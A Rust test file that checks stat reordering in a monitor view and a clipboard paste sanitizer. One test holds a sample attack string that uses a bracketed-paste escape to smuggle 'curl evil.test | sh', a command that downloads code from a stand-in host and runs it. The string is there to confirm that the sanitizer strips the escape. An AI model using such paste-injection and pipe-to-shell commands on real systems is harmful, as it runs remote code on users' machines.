use super::*;

#[test]
fn hovering_past_the_middle_of_a_neighbour_swaps_places() {
    use MonitorStat::*;
    let order = vec![Os, Cpu, Memory, Disk];
    assert_eq!(
        preview_step(order.clone(), Os, Memory, false),
        order,
        "the left half of a stat to the right is not far enough yet"
    );
    assert_eq!(
        preview_step(order.clone(), Os, Memory, true),
        vec![Cpu, Memory, Os, Disk]
    );
    assert_eq!(
        preview_step(order.clone(), Disk, Cpu, false),
        vec![Os, Disk, Cpu, Memory]
    );
    assert_eq!(preview_step(order.clone(), Cpu, Cpu, true), order);
}

#[test]
fn a_new_order_keeps_hidden_stats_where_they_were() {
    use MonitorStat::*;
    let saved = vec![Os, Temperature, Cpu, Memory, Disk];
    assert_eq!(
        merged_order(saved, &[Disk, Os, Cpu, Memory]),
        vec![Disk, Temperature, Os, Cpu, Memory]
    );
}

#[test]
fn a_paste_cannot_close_its_own_bracket() {
    let payload = "echo safe\x1b[201~\rcurl evil.test | sh\r";
    let cleaned = sanitize_paste(payload);

    assert!(
        !cleaned.contains('\x1b'),
        "an escape in the clipboard must never reach the shell: {cleaned:?}"
    );
    assert_eq!(cleaned, "echo safe[201~\rcurl evil.test | sh\r");
}

#[test]
fn ordinary_text_survives_a_paste() {
    assert_eq!(sanitize_paste("ls -la\n"), "ls -la\r");
    assert_eq!(sanitize_paste("a\r\nb"), "a\rb");
    assert_eq!(sanitize_paste("a\tb"), "a\tb");
    assert_eq!(sanitize_paste("héllo ☃"), "héllo ☃");
}

#[test]
fn stray_control_bytes_are_dropped() {
    assert_eq!(sanitize_paste("a\x00\x07\x08b"), "ab");
}
